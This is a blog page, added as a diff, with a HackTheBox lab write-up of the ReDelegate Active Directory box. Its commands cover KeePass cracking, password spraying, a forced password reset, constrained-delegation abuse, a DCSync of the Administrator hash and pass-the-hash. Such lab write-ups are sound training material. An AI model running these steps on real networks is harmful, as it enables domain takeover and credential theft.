@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HackTheBox: ReDelegate — Satej Chaudhari</title>
+  <meta name="description" content="HackTheBox ReDelegate walkthrough — anonymous FTP yields a KeePass database cracked with a hint-built wordlist, secrets spray into MSSQL and AD, a ForceChangePassword ACL takes over a user, and SeEnableDelegationPrivilege plus GenericAll on a computer is abused for constrained delegation with protocol transition to DCSync the domain.">
+
+  <link rel="icon" type="image/svg+xml" href="../assets/img/favicon.svg">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <script>
+  (function(){
+    try{var t=localStorage.getItem('theme');if(t==='light'||t==='dark')document.documentElement.setAttribute('data-theme',t);}catch(e){}
+    document.addEventListener('DOMContentLoaded',function(){
+      var b=document.querySelector('.theme-toggle');
+      if(b)b.addEventListener('click',function(){
+        var d=document.documentElement,c=d.getAttribute('data-theme')||'dark',n=c==='dark'?'light':'dark';
+        d.setAttribute('data-theme',n);try{localStorage.setItem('theme',n);}catch(e){}
+      });
+      var nt=document.querySelector('.nav-toggle'),nv=document.querySelector('.site-nav');
+      if(nt&&nv&&!nt.dataset.bound){nt.dataset.bound='1';nt.addEventListener('click',function(){var o=nv.classList.toggle('open');nt.setAttribute('aria-expanded',o?'true':'false');});}
+    });
+  })();
+  </script>
+</head>
+<body>
+
+  <header class="site-header">
+    <div class="wrap-wide">
+      <a class="brand" href="../index.html">
+        <span class="brand-mark">SC</span>
+        <span class="brand-name">Satej Chaudhari</span>
+      </a>
+      <nav class="site-nav">
+        <a href="../index.html">Home</a>
+        <a href="../theory.html">Theory</a>
+        <a href="../toolkit.html">Toolkit</a>
+        <a href="../vulns.html">Vulns &amp; Misconfigs</a>
+        <a href="../writeups.html">Writeups</a>
+      </nav>
+      <button class="theme-toggle" aria-label="Toggle light and dark theme" title="Toggle theme">
+        <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg>
+        <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line></svg>
+      </button>
+      <button class="nav-toggle" aria-label="Toggle menu" aria-expanded="false">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
+      </button>
+    </div>
+  </header>
+
+  <main class="wrap post">
+    <a class="post-back" href="../writeups.html">&larr; back to writeups</a>
+
+    <article>
+      <header class="post-header">
+        <span class="tag">HackTheBox</span>
+        <h1 class="post-title">HackTheBox: ReDelegate</h1>
+        <p class="post-meta">
+          <time datetime="2026-10-02">2026-10-02</time>
+          <span>&middot; 12 min read</span>
+        </p>
+      </header>
+
+      <div class="post-body">
+
+        <p><strong>ReDelegate</strong> is an Active Directory box (<code>redelegate.vl</code>). Anonymous FTP yields a KeePass database cracked with a hint-built wordlist, those secrets spray into MSSQL and then AD, a ForceChangePassword ACL takes over a user, and that user's <code>SeEnableDelegationPrivilege</code> plus GenericAll over a computer is abused for constrained delegation with protocol transition — ending in a DCSync of the Administrator hash.</p>
+
+        <h2>Reconnaissance</h2>
+
+        <pre><code>nmap -Pn -p- -sC -sV 10.129.11.197
+
+21/tcp   ftp           Microsoft ftpd  (Anonymous FTP allowed)
+88/tcp   kerberos-sec
+389/tcp  ldap          redelegate.vl, dc.redelegate.vl
+1433/tcp ms-sql-s      Microsoft SQL Server 2019
+5985/tcp http          WinRM</code></pre>
+
+        <h2>Anonymous FTP &amp; a hint-built wordlist</h2>
+
+        <p>Anonymous FTP holds three files:</p>
+
+        <pre><code>ftp anonymous@10.129.11.197
+  CyberAudit.txt   Shared.kdbx   TrainingAgenda.txt</code></pre>
+
+        <p>The training agenda drops a strong hint about the password policy:</p>
+
+        <pre><code>&quot;Weak Passwords&quot; - Why &quot;SeasonYear!&quot; is not a good password</code></pre>
+
+        <p>That yields a small seasonal wordlist. (Re-fetch the KeePass file in <code>binary</code> mode — ASCII mode corrupts it.)</p>
+
+        <pre><code>Spring2024!
+Summer2024!
+Autumn2024!
+Fall2024!
+Winter2024!</code></pre>
+
+        <h2>Cracking the KeePass database</h2>
+
+        <pre><code>python keepass2john.py Shared.kdbx &gt; Shared.hash
+john --wordlist=wordlist.txt Shared.hash
+Fall2024!   (Shared)</code></pre>
+
+        <p>Opening the database in KeePassXC with <code>Fall2024!</code> reveals a set of stored secrets, all added to the wordlist for spraying.</p>
+
+        <figure>
+          <img src="../assets/img/htb-redelegate/img1.png" alt="The unlocked KeePass database in KeePassXC">
+          <figcaption>The KeePass entries, unlocked — more passwords to spray.</figcaption>
+        </figure>
+
+        <h2>MSSQL → AD foothold</h2>
+
+        <p>Only one secret authenticates — to MSSQL, as a local login:</p>
+
+        <pre><code>netexec mssql 10.129.11.197 -u SQLGuest -p zDPBpaF4FywlqIv11vii --local-auth
+[+] DC\SQLGuest:zDPBpaF4FywlqIv11vii</code></pre>
+
+        <p>Enumerating SQL logins (via Metasploit's <code>mssql_enum_sql_logins</code>) expands the user list, and re-spraying the cracked passwords across AD lands a domain user:</p>
+
+        <pre><code>bloodhound-python -u Marie.Curie -p &#x27;Fall2024!&#x27; -d redelegate.vl -ns 10.129.11.197 -c ALL --zip</code></pre>
+
+        <figure>
+          <img src="../assets/img/htb-redelegate/img2.png" alt="BloodHound showing Marie.Curie&#x27;s ForceChangePassword over helen.frost">
+          <figcaption>BloodHound: <code>Marie.Curie</code> can force-change <code>helen.frost</code>'s password.</figcaption>
+        </figure>
+
+        <h2>ForceChangePassword → user flag</h2>
+
+        <p>Marie.Curie holds ForceChangePassword over <code>helen.frost</code>; reset it, grab a ticket, and WinRM in:</p>
+
+        <pre><code>bloodyAD -d redelegate.vl -u marie.curie -p Fall2024! --dc-ip 10.129.234.50 \
+  set password helen.frost &#x27;Password@1&#x27;
+impacket-getTGT -k redelegate.vl/helen.frost:&#x27;Password@1&#x27;
+KRB5CCNAME=helen.frost.ccache evil-winrm -r redelegate.vl -i dc.redelegate.vl</code></pre>
+
+        <p><code>helen.frost</code> has the user flag — and a very interesting privilege:</p>
+
+        <pre><code>whoami /priv
+SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation   Enabled
+SeMachineAccountPrivilege     Add workstations to domain                                      Enabled</code></pre>
+
+        <figure>
+          <img src="../assets/img/htb-redelegate/img3.png" alt="PowerView/BloodHound enumeration of the delegation rights">
+          <figcaption>Enumerating the delegation rights available to <code>helen.frost</code>.</figcaption>
+        </figure>
+
+        <h2>Constrained delegation → Domain Admin</h2>
+
+        <p>helen.frost has GenericAll over the computer <code>FS01$</code>. Take ownership, reset its password, and flag it for protocol-transition delegation:</p>
+
+        <pre><code>bloodyAD ... set owner &#x27;FS01$&#x27; helen.frost
+bloodyAD ... set password &#x27;FS01$&#x27; &#x27;Password@1&#x27;
+bloodyAD ... add uac FS01$ -f TRUSTED_TO_AUTH_FOR_DELEGATION</code></pre>
+
+        <blockquote><code>TRUSTED_TO_AUTH_FOR_DELEGATION</code> enables protocol transition (S4U2self), so <code>FS01$</code> can request a service ticket as any user without their password; <code>msDS-AllowedToDelegateTo = cifs/dc.redelegate.vl</code> then says it may delegate to the DC's CIFS service. Setting that attribute is only permitted because helen.frost holds <code>SeEnableDelegationPrivilege</code> — that privilege is the linchpin of the whole box. No shares are touched; <code>cifs/</code> is just one SPN the DC registers (<code>ldap/</code> works too).</blockquote>
+
+        <pre><code>impacket-getTGT -k redelegate.vl/helen.frost:&#x27;Password@1&#x27;
+export KRB5CCNAME=helen.frost.ccache
+bloodyAD -d redelegate.vl -k --host dc.redelegate.vl \
+  set object FS01$ msDS-AllowedToDelegateTo -v cifs/dc.redelegate.vl</code></pre>
+
+        <p>Now request a ticket to the DC's CIFS service while impersonating the <code>dc</code> account (S4U2self + S4U2proxy):</p>
+
+        <pre><code>impacket-getST -k -no-pass -spn cifs/dc.redelegate.vl -impersonate dc redelegate.vl/FS01$
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in dc@cifs_dc.redelegate.vl@REDELEGATE.VL.ccache</code></pre>
+
+        <figure>
+          <img src="../assets/img/htb-redelegate/img4.png" alt="Setting the TRUSTED_TO_AUTH_FOR_DELEGATION flag on FS01$">
+          <figcaption><code>FS01$</code> flagged <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>.</figcaption>
+        </figure>
+
+        <p>That CIFS ticket to the DC is enough to dump the Administrator hash, then pass-the-hash in:</p>
+
+        <pre><code>export KRB5CCNAME=dc@cifs_dc.redelegate.vl@REDELEGATE.VL.ccache
+impacket-secretsdump -k -no-pass dc.redelegate.vl -just-dc-user Administrator
+Administrator:500:aad3b435...:ec17f7a2a4d96e177bfd101b94ffc0a7:::
+
+evil-winrm -i dc.redelegate.vl -u Administrator -H ec17f7a2a4d96e177bfd101b94ffc0a7
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt</code></pre>
+
+      </div>
+    </article>
+  </main>
+
+  <footer class="site-footer">
+    <div class="wrap-wide">
+      <p>&copy; 2026 Satej Chaudhari</p>
+      <div class="footer-links">
+        <a href="../writeups.html">Writeups</a>
+        <a href="../theory.html">Theory</a>
+<a href="../toolkit.html">Toolkit</a>
+        <a href="../vulns.html">Vulns &amp; Misconfigs</a>
+        <a href="../disclaimer.html">Disclaimer</a>
+      </div>
+    </div>
+  </footer>
+
+  <script src="../assets/js/main.js"></script>
+</body>
+</html>
